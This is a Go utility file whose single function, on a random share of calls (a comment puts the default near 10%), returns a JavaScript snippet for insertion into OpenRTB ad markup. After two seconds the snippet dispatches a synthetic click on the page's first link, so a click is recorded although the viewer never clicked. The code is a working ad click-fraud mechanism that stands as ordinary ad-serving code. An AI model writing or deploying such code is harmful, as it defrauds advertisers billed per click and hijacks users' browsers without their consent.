package utils

import (
	"math/rand"
)

func GetOpenRTBAdmTriggerClick(triggerThreshold int) string {
	scriptStr := ``
	// 设置10%概率自动触发click点击事件
	triggerRand := rand.Intn(100)
	// triggerThreshold := 10 // 默认阈值 10/100 10% 概率触发自动点击
	if triggerRand <= triggerThreshold {
		scriptStr += `<script>setTimeout(function(){ try { let elem = document.getElementsByTagName("a")[0]; if(elem.dispatchEvent){ let evn = document.createEvent("MouseEvents"); evn.initEvent("click", true, true); elem.dispatchEvent(evn); }else if(elem.fireEvent) { elem.fireEvent("onclick"); } }catch(err){} }, 2000);</script>`
	}

	// adm html内容转义
	/*scriptStr = strings.Replace(scriptStr, "\\", "\\\\", -1)
	scriptStr = strings.Replace(scriptStr, "<", "\\x3C", -1)
	scriptStr = strings.Replace(scriptStr, ">", "\\x3E", -1)
	scriptStr = strings.Replace(scriptStr, "'", "\\'", -1)
	scriptStr = strings.Replace(scriptStr, "\"", "\\\"", -1)*/

	return scriptStr
}
